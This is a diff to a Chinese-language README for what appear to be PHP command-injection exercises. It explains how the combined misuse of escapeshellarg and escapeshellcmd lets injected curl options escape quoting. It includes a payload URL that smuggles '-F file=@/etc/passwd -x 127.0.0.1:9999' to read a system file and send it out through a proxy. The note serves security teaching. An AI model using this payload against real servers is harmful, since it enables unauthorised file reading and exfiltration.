@@ -100,3 +100,30 @@ if __name__ == "__main__":
     GetShell()
     
 ```
+
+### [exec4](./exec4.php)
+
+这是由错误的使用 escapeshellarg 和 escapeshellcmd 造成的参数注入：
+
+```
+$url = "http://127.0.0.1/' -F file=@/etc/passwd -x 127.0.0.1:9999"; 
+```
+
+经过 escapeshellarg 处理后变成为:
+
+```
+'http://127.0.0.1/'\'' -F file=@/etc/passwd -x 127.0.0.1:9999'
+```
+
+再用 escapeshellcmd 处理之后变换成为：
+```
+'http://127.0.0.1/'\\'' -F file=@/etc/passwd -x 127.0.0.1:9999\'
+```
+导致 -F 和 -x 参数逃逸出单引号,造成任意文件读取。
+
+### [exec5](./exec5.php)
+
+主要理解函数 escapeshellarg 到底是用来干什么的， 还有命令解释器是怎么识别选项和参数值的
+
+参考:
+[https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html](https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html)
